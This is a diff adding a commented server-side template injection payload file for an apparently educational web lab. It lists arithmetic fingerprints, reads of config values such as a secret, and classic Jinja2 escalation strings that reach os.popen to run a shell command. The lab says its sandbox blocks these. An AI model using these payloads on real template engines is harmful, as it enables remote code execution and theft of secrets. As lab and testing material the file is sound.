@@ -1,0 +1,41 @@
+# Server-Side Template Injection (SSTI) payloads for weblab's ssti engine.
+#
+# One payload per non-comment line; blank lines and lines starting with '#'
+# are ignored. These probe the /render?name= sink, where user input is spliced
+# into a template ("Hello {{ name }}!") and EVALUATED instead of being treated
+# as inert data.
+#
+# A safe app substitutes the value as plain text, so "{{7*7}}" comes back as the
+# literal string "{{7*7}}". The demo app evaluates it, so "{{7*7}}" renders "49"
+# -- that arithmetic-being-computed IS the bug.
+
+# --- the canonical arithmetic fingerprint (clearest detect signal) ---
+# A safe app echoes these verbatim; a vulnerable one returns the PRODUCT.
+{{7*7}}
+{{7*'7'}}
+{{6*6}}
+${7*7}
+#{7*7}
+
+# --- context / object-attribute reads (the data-exfiltration primitive) ---
+# Non-dunder attribute walks expose objects the template engine put in scope.
+# {{config.secret}} is the prize: the planted SSTI flag lives there.
+{{config}}
+{{config.app}}
+{{config.version}}
+{{config.secret}}
+
+# --- the classic Jinja-style RCE escalation (BLOCKED by the lab sandbox) ---
+# In a real unsandboxed Jinja2 engine, walking the object graph through dunder
+# attributes reaches Python builtins and ultimately os.system -> a shell. The
+# lab's vetted ast walk REJECTS dunder access and calls, so these are reported
+# as "blocked by the lab sandbox" rather than executed -- the lesson without a
+# live shell on the host.
+{{''.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[0]}}
+{{config.__class__}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{self.__init__.__globals__}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
